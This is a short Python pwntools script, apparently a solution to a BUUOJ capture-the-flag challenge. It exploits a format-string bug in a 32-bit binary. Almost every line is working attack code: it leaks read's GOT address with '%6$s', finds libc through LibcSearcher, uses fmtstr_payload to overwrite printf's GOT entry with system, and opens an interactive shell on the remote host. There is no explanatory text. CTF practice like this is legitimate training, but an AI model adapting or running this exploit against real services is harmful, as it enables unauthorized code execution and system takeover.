from pwn import *
from LibcSearcher import *
context(arch='i386', os='linux', log_level='debug')

elf = ELF('./pwn')

io = remote('node4.buuoj.cn', 29596)
# io = process('./pwn')
io.recvuntil(b'Do you know repeater?\n')

payload1 = p32(elf.got['read']) + b'%6$s'
io.send(payload1)

mem_read_addr = u32(io.recv()[4:8])

libc = LibcSearcher('read', mem_read_addr)
libc_base = mem_read_addr - libc.dump('read')
mem_sys_addr = libc_base + libc.dump('system')
mem_printf_addr = libc_base + libc.dump('printf')

payload2 = fmtstr_payload(6, {elf.got['printf']: mem_sys_addr}, write_size = 'byte')
io.send(payload2)
io.interactive()	# choose 3rd of libc
